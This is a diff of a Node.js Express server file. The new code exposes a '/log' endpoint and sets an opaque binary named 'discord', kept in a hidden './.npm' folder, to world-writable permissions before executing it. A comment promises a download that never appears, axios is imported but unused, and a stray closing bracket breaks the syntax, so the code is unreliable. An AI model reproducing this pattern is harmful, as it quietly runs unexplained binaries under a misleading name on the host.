@@ -1,18 +1,49 @@
-const { execFile } = require('child_process');
-const path = require('path');
+const express = require("express");
+const app = express();
 const fs = require('fs');
-const dotenv = require('dotenv');
+const path = require('path');
+const axios = require('axios');
+const { exec } = require('child_process');
+const FILE_PATH = process.env.FILE_PATH || './.npm';
+const PORT = process.env.SERVER_PORT || process.env.PORT || 3000; 
 
-dotenv.config();
-
-const logFile = fs.openSync('app.log', 'a');
-const binaryPath = path.join(__dirname, 'discord');
-const child = execFile(binaryPath, [], {
-    env: env,
-    stdio: ['ignore', logFile, logFile]  
+app.get("/", function(req, res) {
+  res.send("Hello world!");
 });
 
-child.on('error', () => {});
-child.on('exit', () => {
-    fs.closeSync(logFile);
+const subTxtPath = path.join(FILE_PATH, 'log.txt');
+app.get("/log", (req, res) => {
+  fs.readFile(subTxtPath, "utf8", (err, data) => {
+    if (err) {
+      console.error(err);
+      res.status(500).send("Error reading log.txt");
+    } else {
+      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+      res.send(data);
+    }
+  });
+});
+
+const fileName = 'discord';
+const filePath = path.join(FILE_PATH, fileName);
+
+// Download and execute the file
+const Execute = () => {
+      fs.chmodSync(filePath, '777'); 
+
+      console.log('Executing the file...');
+      const child = exec(`./${filePath}`, (error, stdout, stderr) => {
+        if (error) {
+          console.error(`Execution error: ${error}`);
+          return;
+        }
+        // console.log(`${stdout}`);
+        console.error(`${stderr}`);
+      });
+    })
+};
+Execute();
+
+app.listen(PORT, () => {
+  console.log(`Server is running on port:${PORT}`);
 });
